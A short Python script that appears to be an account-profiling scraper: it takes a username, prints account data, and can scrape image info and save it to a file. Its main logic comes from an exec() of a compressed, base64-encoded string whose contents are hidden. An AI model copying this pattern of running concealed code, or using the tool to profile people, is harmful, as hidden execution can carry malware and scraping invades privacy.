#!/bin/env python3

import os, sys
import zlib, base64
exec(zlib.decompress(base64.b64decode('eJwrrizWK0gsydBLLChIzUvRyC/WS08tSS5P0dDUVtLXy8lM0lfS5Eorys9VSCzIVMjMLcgvKtHiAgAXGhJK')))
import argparse

ap = argparse.ArgumentParser()
ap.add_argument("-u", "--username", required=True, help="username of account to scan")
ap.add_argument("-p", "--postscrap", action='store_true', help="scrape all uploaded images info ")
ap.add_argument("-s", "--savedata", action='store_true', help="save data to file")
args = vars(ap.parse_args())
	
os.system("clear")
ig = main(user=args["username"])
ig.print_data()

if args['postscrap']:
	ig.scrap_uploads()

if args['savedata']:
	ig.save_data()